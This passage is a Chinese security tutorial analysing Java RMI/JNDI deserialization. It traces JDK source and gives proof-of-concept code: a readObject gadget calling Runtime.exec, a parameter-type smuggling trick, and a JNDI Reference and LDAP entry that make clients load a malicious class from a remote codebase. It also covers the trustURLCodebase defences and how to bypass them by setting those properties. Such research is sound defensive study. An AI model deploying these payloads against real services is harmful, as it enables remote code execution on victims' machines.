            Class var12 = var42.getReturnType();
            if (var12 != Void.TYPE) {
                //序列化返回值等信息，同样也可以序列化一些恶意类信息
                marshalValue(var12, var10, var11);
            }
        } catch (IOException var32) {
            throw new MarshalException("error marshalling return", var32);
        }
    } catch (Throwable var39) {
        Object var6 = var39;
        this.logCallException(var39);
        ObjectOutput var8 = var2.getResultStream(false);
        if (var39 instanceof Error) {
            var6 = new ServerError("Error occurred in server thread", (Error)var39);
        } else if (var39 instanceof RemoteException) {
            var6 = new ServerException("RemoteException occurred in server thread", (Exception)var39);
        }

        if (suppressStackTraces) {
            clearStackTraces((Throwable)var6);
        }

        var8.writeObject(var6);
        if (var39 instanceof AccessException) {
            throw new IOException("Connection is not reusable", var39);
        }
    } finally {
        var2.releaseInputStream();
        var2.releaseOutputStream();
    }

}
```

好了服务端这边也简单的分析完了，我们来总结一下，在这些过程中可以利用的反序列化点。

首先是服务端调用 bind 方法像 rmiregistry 注册远程方法的信息时，在执行的过程中，调用了 RegistryImpl_Skel.dispatch 方法，反序列化服务端传来的数据，此为一个利用点，我们可以修改传递的数据从而达到从服务端对 rmiregistry 进行反序列化攻击

```
var9 = var2.getInputStream();
//反序列化“hello”字符串
var7 = (String)var9.readObject();
//这个位置本来是属于反序列化出来的“HelloImpl”对象的，但是最终结果得到的是一个Proxy对像
//这个很关键，这个Proxy对象即所为的Stub(存根)，客户端就是通过这个Stub来知道服务端的地址和端口号从                 而进行通信的。
//这里的反序列化点很明显是我们可以利用的，通过RMI服务端执行bind，我们就可以攻击rmiregistry注               册中心，导致其反序列化RCE
var80 = (Remote)var9.readObject();
```

接下来就是客户端调用 lookup 方法向 rmiregistry 进行远程方法信息查询时, rmiregistry 反序列化了客户端传来的数据，这样以来我们就在客户端像 rmiregistry 查询时来构造恶意的反序列化数据。

```
//获取客户端传来的输入流
var8 = var2.getInputStream();
//反序列化字符串“hello”
//同样在反序列化客户端传来的查询数据时，这个点我们也可以利用lookup方法，理论上，我们可以在客              户端用它去主动攻击RMI Registry，也能通过RMI Registry去被动攻击客户端
//尽管lookup时客户端似乎只能传递String类型，但是还是那句话，只要后台不做限制，客户端的东西皆可控
var7 = (String)var8.readObject();
```

然后就是客户端处理 rmiregistry 返回的数据时，我们已知正常情况下 rmiregistry 回返回一个实现了 Remote 的 Proxy 对象，但是我们也可以利用 rmiregistry 返回一些恶意的反序列化对象给客户端，从而进行反序列化攻击。

```
//获取rmiregistry返回的输入流
ObjectInput var4 = var2.getInputStream();
//反序列化返回的Stub
//同样在反序列化rmiregistry返回的Stub时这个点我们也可以利用lookup方法，理论上，我们可以在客              户端用它去主动攻击RMI Registry，也能通过RMI Registry去被动攻击客户端
var22 = (Remote)var4.readObject();
```

接下来就该客户端和服务端之间的通信了，同理客户端通过 rmiregistry 返回的那个 Proxy 对象，也就是所谓的 Stub 和服务端进行通信，首先服务端接受到数据以后，会对客户端传来的所需要远程方法处理的参数进行反序列化，这里又是一个可以利用的点，因为我们从客户端的角度，这个只要后台不做检验，我们就可控

```
this.unmarshalCustomCallData(var41);
//从 ConnectionInputStream里反序列化出远程调用的参数
//这里就是客户端可以用来攻击服务端的点，因为这里对远程调用方法的参数进行了反序列化，由此我们可以传递               恶意的反序列化数据进来
var9 = this.unmarshalParameters(var1, var42, var7);
```

最后就是服务端处理完成后，将结果返回给客户端，同理，这个范围值从服务端的角度来说，也是可控的，甲乙双方可以进行互相攻击。

```
//获取输入流  
        var11 = var7.getInputStream();
        //解封装参数将返回值赋值给var46,也就是把返回的结果字符串“hello”赋值给var47
        //既然将返回的参数还原了，那么其中必定包含了反序列化，由此此处可以是服务端对客户端进行反序列化攻击的              点
      //也就是说，在这个远程调用的过程中，我们可以想办法，把参数的序列化数据替换成恶意序列化数据，我们就能攻击服务端，而服务端，也能替换其返回的序列化数据为恶意序列化数据，进而被动攻击客户端。
        Object var47 = unmarshalValue(var46, (ObjectInput)var11);
        var9 = true;
        clientRefLog.log(Log.BRIEF, "free connection (reuse = true)");
        //释放链接通道
        this.ref.getChannel().free(var6, true);
        var13 = var47;
```

所以总结一下有五条攻击思路

服务端 ------->rmiregistry

客户端 ------->rmiregistry

rmiregistry-------> 客户端

客户端 -------> 服务端

服务端 -------> 客户端

**0x03  客户端攻击服务端**
==================

接下来就一个一个来试验一下，这几条攻击思路。  

首先客户端 (远程方法调用方)，对服务端(远程方法服务方) 进行反序列化攻击，客户端对服务端进行反序列化的攻击关键在于传递的参数

那我们应该怎么来实现呢？我们来重新写一个远程方法的调用,(此处参考了知道创宇大佬的文章和代码 Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS 那些事儿（上） ，大佬的代码地址 https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)

首先我们先修改一下远程方法服务方的代码，为接口中唯一的一个方法添加参数，是一个 Person 类型。

```
package com.rmitest.inter;

import com.rmitest.impl.Person;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IHello extends Remote {
    public String sayHello(Person person)throws RemoteException;
}
```

看一下这个 Person 类的具体细节

```
package com.rmitest.impl;

import java.io.Serializable;

public class Person implements Serializable {
    private static final long serialVersionUID = -8482776308417450924L;
    private String name;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}
```

就是一个简单的 pojo 类，然后修改 HelloImpl 代码实现。

```
package com.rmitest.impl;



import com.rmitest.inter.IHello;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class HelloImpl extends UnicastRemoteObject implements IHello {

    public HelloImpl() throws RemoteException {

    }

    @Override
    public String sayHello(Person person) {
        System.out.println("hello"+person.getName());
        return "hello"+person.getName();
    }
}
```

然后将接口文件放到 Registry 项目中，记得包路径要和在服务方的项目中的路径一样否则会爆 ClassNotFoundException 的错误，Registry 项目中的 IHello 接口中的 sayHello 方法无需添加参数，因为 rmiregistry 在返回给客户端 Stub 时，这个 Stub 中只有对应的服务端的地址，端口号，以及 objID 等信息，并没有相关的参数信息。

Registry 项目目录结构如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50BhmvA7MLFiaa1XfEtcmZCbQkb0bibO3MAY3g1VHk1rBRlS0LLXyWLVVA/640?wx_fmt=png)

最后客户端这边，就只需要将 Person 类按照和服务端一样的包路径拷贝过来，在修改下 IHello 里 sayHell 方法的参数就 ok 了  

```
package com.rmitest.customer;



import com.rmitest.impl.Person;
import com.rmitest.inter.IHello;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class RMICustomer {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        IHello hello = (IHello) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("Hello");
        Person person = new Person();
        person.setName("hack");
        System.out.println(hello.sayHello(person));
    }
}
```

此时一个正常的远程方法调用环境就搭建好了，按理说这种情况下是没有什么反序列化漏洞的，但是如果说服务端的项目中存在一些已知的存在问题的类，例如 Apache Common Collection。我们来模拟一下当服务端存在有存在反序列化问题的类时的情况。

```
package com.rmitest.weakclass;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Weakness implements Serializable {
    private static final long serialVersionUID = 7439581476576889858L;
    private String param;

    public void setParam(String param) {
        this.param = param;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(this.param);
    }
}
```

这里的 Weakness 类只是用来模拟一个在反序列化是会进行高危操作的一个类，比起用 Apache Common Collection 会现显得更加直观。

同样我们客户端如果想要利用这个类来对服务端进行反序列化攻击的话，那么客户端自然也需要存在这个类。所以拷贝一份到客户端，我们之前分析源码的时候看到了，服务端会反序列化客户端传来的需要远程方法处理的参数，这就是我们的攻击点，

```
this.unmarshalCustomCallData(var41);
//从 ConnectionInputStream里反序列化出远程调用的参数
//这里就是客户端可以用来攻击服务端的点，因为这里对远程调用方法的参数进行了反序列化，由此我们可以传递               恶意的反序列化数据进来
var9 = this.unmarshalParameters(var1, var42, var7);
```

我们根据项目的源码可以看到，这里传递的参数类型是一个 Person 类型，Person 这个类型本身是没有问题的，那我们要怎么实现让服务端反序列化 Person 类时能调用 Weakness 类呢？

其实很简单，我们只需要将客户端这边的 Weakness 类修改一下就可以了，我们让 Weakness 继承 PerSon 类就可以实现这个效果了，继承了 PerSon 之后我们的 Weakness 类就是 Person 类型的了，这样传递的时候 Weakness 类就可以被当作 Person 类来进行传递，表面上传递的是 Person 类型的参数，可实际上传递的参数确是 Weakness 类。

```
public class Weakness extends Person implements Serializable {
    private static final long serialVersionUID = 7439581476576889858L;
    private String param;

    public void setParam(String param) {
        this.param = param;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(this.param);
    }
}
```

看一下客户端这边的实现

```
package com.rmitest.customer;



import com.rmitest.inter.IHello;
import com.rmitest.weakclass.Weakness;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class RMICustomer {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        IHello hello = (IHello) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("Hello");
        Weakness weakness = new Weakness();
        weakness.setParam("open /Applications/Calculator.app");
        weakness.setName("hack");
        System.out.println(hello.sayHello(weakness));
    }
}
```

可以看成功将 Weakness 类作为参数进行传递，我们之前说过，服务端在处理客户端传来的远程调用信息时，是会调用 UnicastServerRef.dispatch() 方法的，会反序列化其中的参数

看一下调用链即可知

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50iaeFQiajRbiakllFwia2D1EQL0FJTmnVicOol44D0OMzOtw6kFkTLQsGBJw/640?wx_fmt=png)

```
protected static Object unmarshalValue(Class<?> var0, ObjectInput var1) throws IOException, ClassNotFoundException {
    if (var0.isPrimitive()) {
        if (var0 == Integer.TYPE) {
            return var1.readInt();
        } else if (var0 == Boolean.TYPE) {
            return var1.readBoolean();
        } else if (var0 == Byte.TYPE) {
            return var1.readByte();
        } else if (var0 == Character.TYPE) {
            return var1.readChar();
        } else if (var0 == Short.TYPE) {
            return var1.readShort();
        } else if (var0 == Long.TYPE) {
            return var1.readLong();
        } else if (var0 == Float.TYPE) {
            return var1.readFloat();
        } else if (var0 == Double.TYPE) {
            return var1.readDouble();
        } else {
            throw new Error("Unrecognized primitive type: " + var0);
        }
    } else {
      //最终在参数在 unmarshalValue 的var1.readObject()中被反序列化
        return var1.readObject();
    }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50P9EK1y9fFZVvLaQhWkZE2J6KpYCzg9vrF4gTZibMON9ib1PS4NT6LBRw/640?wx_fmt=png)

**0x04  服务端攻击客户端**
==================

分析完了客户端对服务端的攻击，我们来看一下 服务端对客户端的攻击，根据第二章 RMI 流程源码分析我们看到了，服务端如果想要攻击客户端，那么利用点就存在客户端反序列话服务端的返回值的时候。这时候需要将环境稍微修改一下。

其实很简单，先修改服务端的代码，我们将 IHello 接口中 sayHello 方法需要的参数删除，然后将返回值类型由 String 修改成 Person 类型。

```
package com.rmitest.inter;

import com.rmitest.impl.Person;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IHello extends Remote {
    public Person sayHello()throws RemoteException;
}
```

HelloImpl 也根据接口的要求进行修改

```
package com.rmitest.impl;

import com.rmitest.inter.IHello;
import com.rmitest.weakclass.Weakness;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class HelloImpl extends UnicastRemoteObject implements IHello {

    public HelloImpl() throws RemoteException {

    }

    @Override
    public Person sayHello() {
        Weakness weakness = new Weakness();
        weakness.setParam("open /Applications/Calculator.app");
        weakness.setName("hack");
        return weakness;
    }
}
```

同客户端攻击服务端时一样，只不过这次变成了服务端这边的 Weakness 类需要继承 Person 类了。

然后客户端这边就修改完毕。

然后我们来修改 rmiregistry 这边的代码，同样先修改 IHello 接口，然后我们需要将 Person 类拷贝到 rmiregistry 这边，不过一般在生产环境中，rmiregistry 和服务端一般都是在同一台机器统一个项目文件里，所以服务端可以访问的类 rmiregistry 同样也可以。

紧接着就是就该客户端这边的代码，同理 Weakness 类不再继承 Person

```
public class RMICustomer {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        IHello hello = (IHello) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("Hello");
        Person person = hello.sayHello();
   
    }
}
```

如此一来就可以实现通过服务端去攻击客户端

根据之前的分析客户端在远程方法的调用过程中会在 UnicastRef.invoke 方法中对服务端返回的数据进行反序列化，看一下调用链

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50AYCmWn5X2woHDJEiavQGLDDy9xYqcFyQjfAQGfBnN0KTSRgQBo4y5lw/640?wx_fmt=png)

如此一来服务端通过 RMI 攻击客户端的方式也就清晰了。  

**0x05  服务端攻击客户端 2**
====================

上一小节讲述的服务端攻击客户端的方式是通过返回值来进行操作的，这样的话利用面比较狭窄，那么有没有一种特别通用的利用方式呢？让客户端在 lookup 一个远程方法的时候能直接造成 RCE，事实证明是有的。

这里就要讲到一个特别的类 javax.naming.Reference，下面是该类的官方注释

```
/**
  * This class represents a reference to an object that is found outside of
  * the naming/directory system.
  *<p>
  * Reference provides a way of recording address information about
  * objects which themselves are not directly bound to the naming/directory system.
  *<p>
  * A Reference consists of an ordered list of addresses and class information
  * about the object being referenced.
  * Each address in the list identifies a communications endpoint
  * for the same conceptual object.  The "communications endpoint"
  * is information that indicates how to contact the object. It could
  * be, for example, a network address, a location in memory on the
  * local machine, another process on the same machine, etc.
  * The order of the addresses in the list may be of significance
  * to object factories that interpret the reference.
  *<p>
  * Multiple addresses may arise for
  * various reasons, such as replication or the object offering interfaces
  * over more than one communication mechanism.  The addresses are indexed
  * starting with zero.
  *<p>
  * A Reference also contains information to assist in creating an instance
  * of the object to which this Reference refers.  It contains the class name
  * of that object, and the class name and location of the factory to be used
  * to create the object.
  * The class factory location is a space-separated list of URLs representing
  * the class path used to load the factory.  When the factory class (or
  * any class or resource upon which it depends) needs to be loaded,
  * each URL is used (in order) to attempt to load the class.
  *<p>
  * A Reference instance is not synchronized against concurrent access by multiple
  * threads. Threads that need to access a single Reference concurrently should
  * synchronize amongst themselves and provide the necessary locking.
  *
  * @author Rosanna Lee
  * @author Scott Seligman
  *
  * @see RefAddr
  * @see StringRefAddr
  * @see BinaryRefAddr
  * @since 1.3
  */
```

简单解释下该类的作用就是记录一个远程对象的位置，然后服务端将实例化好的 Reference 类通过 bind 方法注册到 rmiregistry 上，然后客户端通过 rmiregistry 返回的 Stub 信息找到服务端并调用该 Reference 对象，Reference 对象通过 URLClassloader 将记录在 Reference 对象中的 Class 从远程地址上加载到本地，从而触发恶意类中的静态代码块，导致 RCE

我们使用 JDK 7u21 作为环境来进行该利用方式的深入分析

首先看下服务端的代码

```
public class RMIProvider {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException {
//TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可
        Reference refObj = new Reference("ExportObject", "com.longofo.remoteclass.ExportObject", "http://127.0.0.1:8000/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
      //尝试使用JNDI的API来bind，但是会报错
//        Context context = new InitialContext();
//        context.bind("refObj", refObjWrapper);
        Registry registry = LocateRegistry.getRegistry(1099);
        registry.bind("refObj", refObjWrapper);
    }
}
```

可以看到在实例化 Reference 对象的时候会传递三个参数进去，这三个参数分别是

className

包含此引用所引用的对象的类的全限定名。(ps: 就是恶意类的类名或者全限定类名，经过测试该参数不是必须，为空也行，关键在于第二个参数 也就是 classFactory)

classFactory

包含用于创建此引用所引用的对象的实例的工厂类的名称。初始化为零。(ps: 第二个参数很重要 一定要写恶意类的全限定类名)

classFactoryLocation

包含工厂类的位置。初始化为零。(ps: 也就是恶意类存放的远程地址)

接下来就来跟入源码看一看

```
public Reference(String className) {
    this.className  = className;
    addrs = new Vector();
}
........
    public Reference(String className, String factory, String factoryLocation) {
        this(className);
        classFactory = factory;
        classFactoryLocation = factoryLocation;
    }
```

实例化 Reference 期间就只进行以上这些操作

实例化 ReferenceWrapper 的时候同样只进行了简单的赋值操作

```
public ReferenceWrapper(Reference var1) throws NamingException, RemoteException {
    this.wrappee = var1;
}
```

接下来就是通过调用 bind 方法来将 ReferenceWrapper 对象注册到 rmiregistry 中。客户端 bind Reference 过程结束接下来看 rmiregistry 这边

这里呢因为 jdk7u21 和 jdk 8u20 两个版本在调试的时候无法在 RegistryImpl_Skel 的 dispatch 方法上拦截断点所以 暂时采用 jdk 8u221 版本来进行演示

同绑定一个正常的远程对像的差别不大只不过绑定一个正常的远程对象的时候，rmiregistry 反序列化服务端传递来的结果是这样的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50GuLF8dZLdKl3lHMn3pq2mNTyZf7N4NER4db5J4ogiarz9U1iaHRpqVww/640?wx_fmt=png)

而绑定 Reference 的时候 rmiregistry 反序列化服务端传递来的结果是这样的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50FY4UHrIpJv1mhia7u7ibOTBnHpGoVeL2yYWk1ppu4f4tkfBiaVos5nLMw/640?wx_fmt=png)

可以看到最终注册完成后，二者的区别

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50w2dSicQ0F7QCib0iaIgj40uChW88tjpN5SU3kXibjttxu4RIIibEOgnsRVg/640?wx_fmt=png)

普通的远程对象是以一个 Proxy 对象的形式存在，Reference 则是以 ReferenceWrapper_Stub 对象的形式存在

接下来来看客户端调用 Reference 这个远程对象的过程，客户端的代码演示环境为 jdk 8u20

首先看下客户端的代码

```
public class RMICustomer {
    public static void main(String[] args) throws NamingException {
      //使用JNDI的方式来lookup远程对象  
      new InitialContext().lookup("rmi://127.0.0.1:1099/refObj");
    }
}
```

其实 jndi 的 InitialContext().lookup() 底层和 rmi 自己的 LocateRegistry.getRegistry().lookup() 一样都是调用了 RegistryImpl_Stub.lookup() 方法但是 jndi 在此基础上又做了自己的封装，例如在处理 rmiregistry 返回的 ReferenceWrapper_stub 对象时，二者的处理方式就不相同。

rmi 无法处理 ReferenceWrapper_stub 对象，而 jndi 在接收了 rmiregistry 返回的 ReferenceWrapper_stub 对象后，结束当前 lookup 方法，在其上一层的 lookup 方法中也就是 RegistryContext.lookup() 方法里会对返回的 ReferenceWrapper_stub 进行处理

来观察下 RegistryContext.lookup() 方法的具体内容

```
public Object lookup(Name var1) throws NamingException {
    if (var1.isEmpty()) {
        return new RegistryContext(this);
    } else {
        Remote var2;
        try {
          //调用RegistryImpl_Stub.lookup()方法
            var2 = this.registry.lookup(var1.get(0));
        } catch (NotBoundException var4) {
            throw new NameNotFoundException(var1.get(0));
        } catch (RemoteException var5) {
            throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
        }
        //反序列化的ReferenceWrapper_stub对象在该方法中被处理
        return this.decodeObject(var2, var1.getPrefix(1));
    }
}
```

接下来再跟进 decodeObject() 方法之后

```
private Object decodeObject(Remote var1, Name var2) throws NamingException {
    try {
      //判断返回的ReferenceWrapper_stub是否是RemoteReference的子类，结果为真，返回ReferenceWrapper_stub中的Reference对象
        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
      //接着对Reference对象进行操作
        return NamingManager.getObjectInstance(var3, var2, this, this.environment);
    } catch (NamingException var5) {
```

NamingManager.getObjectInstance() 方法就是处理 Reference 对像并导致 RCE 的关键了

```
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{

    ObjectFactory factory;
......
    //判断并接收Reference对象
    Reference ref = null;
    if (refInfo instanceof Reference) {
        ref = (Reference) refInfo;
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }

    Object answer;

    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively
            // 这里会将Reference对象传入并且同时传入全限定类名
            factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
                return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;

        } else {
            // if reference has no factory, check for addresses
            // containing URLs

            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }

    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

根据观察 NamingManager.getObjectInstance() 方法的内部实现，关键代码在于这一段 factory = getObjectFactoryFromReference(ref, f);

跟进 getObjectFactoryFromReference 方法，

```
static ObjectFactory getObjectFactoryFromReference(
    Reference ref, String factoryName)
    throws IllegalAccessException,
    InstantiationException,
    MalformedURLException {
    Class<?> clas = null;

    // Try to use current class loader
    try {
      //首先会尝试使用AppClassloder从本地加载恶意类，当然肯定是失败的
         clas = helper.loadClass(factoryName);
    } catch (ClassNotFoundException e) {
        // ignore and continue
        // e.printStackTrace();
    }
    // All other exceptions are passed up.

    // Not in class path; try to use codebase
    String codebase;
    if (clas == null &&
        //获取codebase地址
            (codebase = ref.getFactoryClassLocation()) != null) {
        try {
          //该方法内会实例化一个URlClassloader 并从codebase中的地址中的位置去请求并加载恶意类
            clas = helper.loadClass(factoryName, codebase);
        } catch (ClassNotFoundException e) {
        }
    }

    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```

可以看到真正负责从远程地址加载恶意类的是第二次的 helper.loadClass(factoryName, codebase)

该方法的具体实现如下

```
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {
    //获取当前上下文的Classloader 也就是AppClassloader
    ClassLoader parent = getContextClassLoader();
    //实例化一个URLClassloader  
  ClassLoader cl =
             URLClassLoader.newInstance(getUrlArray(codebase), parent);
    //去远程加载恶意类
    return loadClass(className, cl);
}
```

这就是服务端攻击客户端的另一种方式，虽然本质上还是有 rmi 去访问 rmiregistry 获取的 Reference 对象，但是由于 JNDI 对 rmi 进行了又一次的封装导致两者对 Reference 对象的处理不一样，所以客户端只有在使用 JNDI 提供的方法去访问 rmiregistry 获取的 Reference 对象时才会触发 RCE。

这个方法看上去好像很通用，在 jdk 8u121 版本之前确实如此，但是在 jdk 8u121 版本以及之后的版本中，此方法默认情况下就不再可用了，因为从 jdk 8u121 版本开始 增加了对 com.sun.jndi.rmi.object.trustURLCodebase 的值的校验，而该值默认为 false，所以默认情况下想要通过 Reference 对象来远程加载恶意类的想法是行不通了，

我们来看一下 jdk 8u121 版本究竟为了防止远程加载恶意类做了哪些改动

首先在还没有通过 rmi 去到 rmiregistry 获取 Reference 对象之前，在 RegistryContext 这个类被加载的时候就执行了以下的静态代码

```
static {
    PrivilegedAction var0 = () -> {
        return System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
    };
    String var1 = (String)AccessController.doPrivileged(var0);
    trustURLCodebase = "true".equalsIgnoreCase(var1);
}
```

可以看到这里获取了 com.sun.jndi.rmi.object.trustURLCodebase 默认值为 false

然后当执行进 decodeObject() 方法，并且准备执行 NamingManager.getObjectInstance() 方法之前多了以下判断

```
if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
    throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
} else {
    return NamingManager.getObjectInstance(var3, var2, this, this.environment);
}
```

就是判断了 com.sun.jndi.rmi.object.trustURLCodebase 的值，由于该值为 false 所以就会跑出异常中止执行

想要 jdk 8u121 版本能够正常远程加载就去要加上以下代码

```
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
```

这样就能又正常的 RCE 了

但是在 JDK 8u191 及以后的版本中客户端 lookup 以前加上上面的代码之后，从新执行会发现不报错了，但是仍然无法 RCE，这是为什么呢，我们继续跟着源码往下看

在通过了 RegistryContext 中对 com.sun.jndi.rmi.object.trustURLCodebase 的判断并执行了 NamingManager.getObjectInstance() 方法之后，一路正常执行来到了关键的实例化 URLClassloader 并远程加载恶意类的最后一步，然后你就会发现这里变了

```
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {
  //此处有增加了一个对trustURLCodebase属性的一个判断，这个trustURLCodebase属性和RegistryContext类
  //中的trustURLCodebase属性完全不同
  if ("true".equalsIgnoreCase(trustURLCodebase)) {
        ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
                URLClassLoader.newInstance(getUrlArray(codebase), parent);

        return loadClass(className, cl);
    } else {
        return null;
    }
}
```

我们来看下这个 trustURLCodebase 的值究竟是怎么获取的  

```
private static final String TRUST_URL_CODEBASE_PROPERTY =
            "com.sun.jndi.ldap.object.trustURLCodebase";
    private static final String trustURLCodebase =
            AccessController.doPrivileged(
                new PrivilegedAction<String>() {
                    public String run() {
                        try {
                        return System.getProperty(TRUST_URL_CODEBASE_PROPERTY,
                            "false");
                        } catch (SecurityException e) {
                        return "false";
                        }
                    }
                }
            );
```

这次获取的是一个名称为 TRUST_URL_CODEBASE_PROPERTY 的属性值，也就是说我们需要将该值也设置为 true 才行

```
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
//至于这个com.sun.jndi.ldap.object.trustURLCodebase这个属性会在后续的JNDI Reference的LDAP攻击响亮中讲到。
 System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
```

也就是说 在 jdk 8u191 及其以后的版本中如果想让 JNDI Reference rmi 攻击向量成功 RCE 的话 目标服务器就必须在 lookup 之前加上以上两行代码

由此可见在 jdk 8u191 及其以后的版本中通过这种方式来进行 RCE 攻击几乎不可能实现了。

**0x06  服务端攻击客户端 3**
====================

在上一小节中通过使用 JNDI 的 Reference rmi 攻击向量进行 RCE 攻击，根据网络上大佬们提供的思路，除了使用 rmi 攻击向量以外还可以使用 JNDI Ldap 向量来进行攻击

话不多说直接上源码，首先先看下 Ldap 服务端源码

```
public class LDAPSeriServer {

    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main(String[] args) throws IOException {
        int port = 1389;

        try {
          //这里的代码只是在内存中模拟了一个ldap服务，本机上并不存在一个ldap数据库所以程序结束后这些就都消失了
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.setSchema(null);
            config.setEnforceAttributeSyntaxCompliance(false);
            config.setEnforceSingleStructuralObjectClass(false);
          //向ldap服务中添加数据条目，具体ldap条目相关细节可以去学习ldap相关知识，这里就不做详细讲解了
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            ds.add("dn: " + "dc=example,dc=com", "objectClass: top", "objectclass: domain");
            ds.add("dn: " + "ou=employees,dc=example,dc=com", "objectClass: organizationalUnit", "objectClass: top");
            ds.add("dn: " + "uid=longofo,ou=employees,dc=example,dc=com", "objectClass: ExportObject");

            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

以上的代码呢就是在本地起了一个 ldap 服务监听 1389 端口，并向其中添加了一条可被查询的条目。单起一个 ldap 服务肯定是不够的，既然是 ldap RCE 攻击向量，那就肯定要添加一些东西让 客户端在通过 JNDI 查询该 Ldap 的条目之后转而去指定的服务器上加载恶意类。

所以需要向该条目中添加一些属性，根据知道创宇 404 实验室的 Longofo 大佬的文章

```
public class LDAPServer1 {
    public static void main(String[] args) throws NamingException, RemoteException {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://localhost:1389");

        DirContext ctx = new InitialDirContext(env);

        Attribute mod1 = new BasicAttribute("objectClass", "top");
        mod1.add("javaNamingReference");

        Attribute mod2 = new BasicAttribute("javaCodebase",
                "http://127.0.0.1:8000/");
        Attribute mod3 = new BasicAttribute("javaClassName",
                "ExportObject");
        Attribute mod4 = new BasicAttribute("javaFactory", "com.longofo.remoteclass.ExportObject");


        ModificationItem[] mods = new ModificationItem[]{
                new ModificationItem(DirContext.ADD_ATTRIBUTE, mod1),
                new ModificationItem(DirContext.ADD_ATTRIBUTE, mod2),
                new ModificationItem(DirContext.ADD_ATTRIBUTE, mod3),
                new ModificationItem(DirContext.ADD_ATTRIBUTE, mod4)
        };
        ctx.modifyAttributes("uid=longofo,ou=employees,dc=example,dc=com", mods);
    }
}
```

这里是向之前创建好的 ldap 索引中添加一些属性，客户端在向服务端查询该条索引，服务端返回查询结果，客户端根据服务端的返回结果然后去指定位置查找并加载恶意类，这就是 ldap 攻击向量一次 RCE 攻击的流程。

这里我们就要具体关注下 JNDI 客户端是如何在访问 Ldap 服务的时候被 RCE 的

首先客户端代码

```
public class LDAPClient1 {
    public static void main(String[] args) throws NamingException {
        Context ctx = new InitialContext();
        Object object = ctx.lookup("ldap://127.0.0.1:1389/uid=longofo,ou=employees,dc=example,dc=com");
    }
}
```

